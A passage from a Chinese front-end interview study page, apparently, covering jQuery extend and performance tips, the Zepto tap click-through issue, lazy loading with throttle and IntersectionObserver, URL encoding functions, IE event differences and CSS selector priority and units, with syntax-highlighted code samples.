      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
        target<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> options<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span> 
      <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span> target<span class="token punctuation">;</span> 
  <span class="token punctuation">}</span> 
<span class="token punctuation">}</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>深拷贝分析： 跟js中对象的深拷贝类似；</p> <p>具体分为三种情况：</p> <p>1. 属性是数组时，则将target[name]初始化为空数组，然后递归调用extend；
　　2. 属性是对象时，则将target[name]初始化为空对象，然后递归调用extend；
　　3. 否则，直接复制属性。</p> <h4 id="jquery-和-zepto-的区别及使用场景"><a href="#jquery-和-zepto-的区别及使用场景" class="header-anchor">#</a> jQuery 和 Zepto 的区别及使用场景</h4> <ul><li>jQuery 主要目标是PC的网页中，兼容全部主流浏览器。<strong>在移动设备方面，单独推出 jQuery Mobile</strong></li> <li>Zepto 从<strong>一开始就定位移动设备，相对更轻量级</strong>。它的 <strong>API 基本兼容 jQuery，但对PC浏览器兼容不理想</strong></li></ul> <h4 id="tap事件点透问题"><a href="#tap事件点透问题" class="header-anchor">#</a> tap事件点透问题</h4> <blockquote><h4 id="为什么基本相同的代码-zepto会点透而fastclick不会呢"><a href="#为什么基本相同的代码-zepto会点透而fastclick不会呢" class="header-anchor">#</a> 为什么基本相同的代码，zepto会点透而fastclick不会呢？</h4></blockquote> <p>**原因: **zepto的代码里面有个settimeout，<strong>在settimeout里面执行e.preventDefault()不会生效</strong>，因此zepto中的延迟300ms的click事件会触发，而fastClick不会。</p> <p>所以<strong>zepto的tap事件（通过touchstart和touchend模拟出来的）有点透问题</strong>，而fastClick的click事件（通过touchstart和touchend模拟出来的）没有。</p> <p>因为<strong>zepto的tap事件统一是在document的touchend时触发的</strong>，若在这里使用e.preventDefault()，那页面上所有元素在touchend后触发的事件都不会被执行了。<strong>fastClick</strong>使用了touch事件但是touch事件是<strong>绑定到了具体dom而不是document上;</strong></p> <h4 id="性能的优化方法【要点】"><a href="#性能的优化方法【要点】" class="header-anchor">#</a> 性能的优化方法【要点】</h4> <ul><li><strong>缓存频繁操作DOM对象</strong>; 频繁操作的DOM，先缓存起来再操作。</li> <li><strong>尽量使用id选择器代替class选择器</strong>; 因为需遍历所有DOM元素。</li> <li><strong>总是从#id选择器来继承</strong>;</li> <li><strong>尽量使用链式操作</strong>; 用Jquery的链式调用更好。</li> <li><strong>使用事件委托 on 绑定事件</strong>;</li> <li><strong>采用jQuery的内部函数data()来存储数据</strong>;</li> <li><strong>使用最新版本的 jQuery</strong>;</li> <li>加入防抖动功能；</li></ul> <p>示例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> str<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">&quot;href&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//比如：</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> size<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> size<span class="token punctuation">,</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">// 优化后</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="可视区域懒加载【要点】"><a href="#可视区域懒加载【要点】" class="header-anchor">#</a> 可视区域懒加载【要点】</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//第一种</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
  <span class="token keyword">function</span> <span class="token function">lazyload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> images <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> len    <span class="token operator">=</span> images<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  <span class="token keyword">var</span> n      <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//存储图片加载到的位置，避免每次都从第一张图片开始遍历		</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> seeHeight <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>
    <span class="token keyword">var</span> scrollTop <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>scrollTop <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>scrollTop<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>images<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>offsetTop <span class="token operator">&lt;</span> seeHeight <span class="token operator">+</span> scrollTop<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>images<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'images/loading.gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          images<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">=</span> images<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'data-src'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        n <span class="token operator">=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> loadImages <span class="token operator">=</span> <span class="token function">lazyload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">loadImages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//初始化首页的页面图片</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> loadImages<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>

<span class="token comment">//在做事件绑定的时候，可以对 lazyload 函数进行函数节流（throttle）与函数去抖（debounce）处理。</span>
<span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> atleast</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> startTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> curTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>curTime <span class="token operator">-</span> startTime <span class="token operator">&gt;=</span> atleast<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            startTime <span class="token operator">=</span> curTime<span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
            timeout <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> loadImages <span class="token operator">=</span> <span class="token function">lazyload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">loadImages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//初始化首页的页面图片</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> <span class="token function">throttle</span><span class="token punctuation">(</span>loadImages<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>使用 <code>IntersectionObserver API</code>；目前有一个新的<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserver" target="_blank" rel="noopener noreferrer">IntersectionObserver API<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，<strong>可以自动&quot;观察&quot;元素是否可见</strong>，Chrome 51+ 已经支持。</p> <ul><li>io.observe(document.getElementById('example'));// 开始观察</li> <li>io.unobserve(element);// 停止观察</li> <li>io.disconnect();// 关闭观察器</li></ul> <p>IntersectionObserver API 是异步的，不随着目标元素的滚动同步触发。</p> <p>规格写明，<code>IntersectionObserver</code>的实现，<strong>应该采用<code>requestIdleCallback()</code>，即只有线程空闲下来，才会执行观察器。这意味着，这个观察器的优先级非常低，只在其他任务执行完，浏览器有了空闲才会执行。</strong></p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
            <span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token parameter">selector</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">var</span> io <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">items</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                items<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">var</span> target <span class="token operator">=</span> item<span class="token punctuation">.</span>target<span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'images/loading.gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        target<span class="token punctuation">.</span>src <span class="token operator">=</span> target<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'data-src'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                io<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h4 id="懒加载资源"><a href="#懒加载资源" class="header-anchor">#</a> 懒加载资源</h4> <p>有时，我们希望某些静态资源（比如图片），只有用户向下滚动，它们进入视口时才加载，这样可以节省带宽，提高网页性能。这就叫做&quot;惰性加载&quot;。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token parameter">selector</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> observer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span>
  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">changes</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    changes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">change</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> container <span class="token operator">=</span> change<span class="token punctuation">.</span>target<span class="token punctuation">;</span>
      <span class="token keyword">var</span> content <span class="token operator">=</span> container<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'template'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">;</span>
      container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
      observer<span class="token punctuation">.</span><span class="token function">unobserve</span><span class="token punctuation">(</span>container<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'.lazy-loaded'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  observer<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h3 id="_10-其他及兼容及优化"><a href="#_10-其他及兼容及优化" class="header-anchor">#</a> 10:其他及兼容及优化</h3> <h4 id="不同类型的弹出框"><a href="#不同类型的弹出框" class="header-anchor">#</a> 不同类型的弹出框</h4> <p>在JS中有三种类型的弹出框可用，分别是：</p> <ul><li>Alert</li> <li>Confirm</li> <li>Prompt</li></ul> <h4 id="编码和解码url"><a href="#编码和解码url" class="header-anchor">#</a> 编码和解码URL</h4> <ul><li>escape 和 unescape</li> <li>encodeURI 和 decodeURI</li> <li>encodeURIComponent 和 decodeURIComponent</li></ul> <p>总括：</p> <ul><li>escape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值。比如&quot;春节&quot;的返回结果是%u6625%u8282，，escape()不对&quot;+&quot;编码 主要用于汉字编码，现在已经不提倡使用。</li> <li>encodeURI()是Javascript中<strong>真正用来对URL编码的函数。 编码整个url地址，但对特殊含义的符号</strong>&quot;; / ? : @ &amp; = + $ , #&quot;，也不进行编码。对应的解码函数是：decodeURI()。</li> <li>encodeURIComponent() 与encodeURI()的区别是，<strong>它用于对URL的组成部分进行个别编码，而不用于对整个URL进行编码。</strong> 能编码&quot;; / ? : @ &amp; = + $ , #&quot;这些特殊字符。对应的解码函数是decodeURIComponent()。<strong>假如要传递带&amp;符号的网址，所以用encodeURIComponent()</strong></li></ul> <p><strong>encodeURI()</strong> 函数用于在JS中对URL进行编码。它将url字符串作为参数并返回编码的字符串。</p> <p><strong>注意</strong>： encodeURI()不会编码类似这样字符： / ? : @ &amp; = + $ #，如果需要编码这些字符，请使用encodeURIComponent()。 用法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">&quot;http://localhost:8080/pro?a=1&amp;b=张三&amp;c=aaa&quot;</span><span class="token punctuation">;</span>
<span class="token function">encodeURI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token operator">--</span><span class="token operator">&gt;</span>   http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>pro<span class="token operator">?</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token number">89</span><span class="token operator">&amp;</span>c<span class="token operator">=</span>aaa 

<span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">&quot;http://localhost:8080/pp?a=1&amp;b=&quot;</span><span class="token operator">+</span> paramUrl<span class="token punctuation">;</span>
<span class="token keyword">var</span> paramUrl <span class="token operator">=</span> <span class="token string">&quot;http://localhost:8080/aa?a=1&amp;b=2&amp;c=3&quot;</span><span class="token punctuation">;</span>
<span class="token comment">//应该使用encodeURIComponent()进行转码　　</span>
<span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>paramUrl<span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>pp<span class="token operator">?</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>http<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Flocalhost<span class="token operator">%</span><span class="token number">3</span>A8080<span class="token operator">%</span><span class="token number">2</span>Faa<span class="token operator">%</span><span class="token number">3</span>Fa<span class="token operator">%</span><span class="token number">3</span>D1<span class="token operator">%</span><span class="token number">26</span>b<span class="token operator">%</span><span class="token number">3</span>D2<span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">26</span>c<span class="token operator">%</span><span class="token number">3</span>D3
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><strong>decodeURI()</strong> 函数用于解码js中的URL。它将编码的url字符串作为参数并返回已解码的字符串，用法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> uri <span class="token operator">=</span> <span class="token string">&quot;my profile.php?name=sammer&amp;occupation=pāntiNG&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> encoded_uri <span class="token operator">=</span> <span class="token function">encodeURI</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">decodeURI</span><span class="token punctuation">(</span>encoded_uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="兼容考虑到的"><a href="#兼容考虑到的" class="header-anchor">#</a> 兼容考虑到的</h4> <ul><li>Polyfill；</li> <li>优雅降级和渐进增强；</li> <li>浏览器检测；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//检查是否是微信端；</span>
<span class="token keyword">function</span> <span class="token function">isWeiXin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> ua <span class="token operator">=</span> window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ua<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">MicroMessenger</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;micromessenger&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="ie与其他浏览器不一样的特性"><a href="#ie与其他浏览器不一样的特性" class="header-anchor">#</a> IE与其他浏览器不一样的特性</h4> <p><strong>事件不同之处</strong>：详细见上面 【自己封装事件类】的实现；</p> <ul><li>触发事件的元素被认为是目标（target）。而在 IE 中，目标包含在 event 对象的 srcElement 属性；</li> <li>获取字符代码、如果按键代表一个字符（shift、ctrl、alt除外），IE 的 keyCode 会返回字符代码（Unicode），DOM 中按键的代码和字符是分离的，要获取字符代码，需要使用 charCode 属性；</li> <li><strong>阻止某个事件的默认行为</strong>，IE 中阻止某个事件的默认行为，必须将 returnValue 属性设置为 false，Mozilla 中，需要调用 preventDefault() 方法；</li> <li><strong>停止事件冒泡</strong>，IE 中阻止事件进一步冒泡，需要设置 cancelBubble 为 true，Mozzilla 中，需要调用 stopPropagation()；</li></ul> <h2 id="css-10题"><a href="#css-10题" class="header-anchor">#</a> css[10题]</h2> <h3 id="_1-css选择器的优先级"><a href="#_1-css选择器的优先级" class="header-anchor">#</a> 1:CSS选择器的优先级</h3> <ol><li><p>在属性后面使用 !important 会覆盖页面内任何位置定义的元素样式。  -》最高</p></li> <li><p>作为style属性写在元素内的样式(行内样式) -》1000</p></li> <li><p>id选择器(#myid)  -》100</p></li> <li><p>类选择器(.myclass)  -》10</p></li> <li><p>标签选择器(div, h1,p) -》1</p></li> <li><p>通配符选择器(*)</p></li> <li><p>浏览器自定义或继承</p> <p><code>总结排序</code>：<strong>!important &gt; 行内样式 &gt; ID选择器 &gt; 类选择器 &gt; 标签 &gt; 通配符 &gt; 继承 &gt; 浏览器默认属性</strong></p> <p><strong>总括分析</strong>：1：!important优先级最高；2：后面的会覆盖前面的；3：越具体越优先；</p></li></ol> <h3 id="_2-css单位"><a href="#_2-css单位" class="header-anchor">#</a> 2:CSS单位</h3> <h4 id="比较"><a href="#比较" class="header-anchor">#</a> 比较</h4> <table><thead><tr><th>单位</th> <th>描述</th></tr></thead> <tbody><tr><td>%</td> <td>百分比</td></tr> <tr><td>px</td> <td>像素。计算机屏幕上的一个点为 <code>1px</code>。</td></tr> <tr><td>em</td> <td>相对单位。<strong>相对于父元素计算</strong>，假如某个 p 元素为 <code>font-size: 12px</code>，在它内部有个 span 标签，设置 <code>font-size: 2em</code>，那么，这时候的 span 字体大小为：<code>12 * 2 = 24px</code></td></tr> <tr><td><strong>rem</strong></td> <td>相对单位。<strong>相对于根元素 html 的 <code>font-size</code></strong>，假如 html 为 <code>font-size: 12px</code>，那么，在其当中的 div 设置为 <code>font-size: 2rem</code>，就是当中的 div 为 <code>24px</code>。</td></tr> <tr><td>rpx</td> <td><strong>微信小程序相对单位</strong>。1rpx = 屏幕宽度 / 750 px。在 750px 的设计稿上，1rpx = 1px。</td></tr></tbody></table> <h4 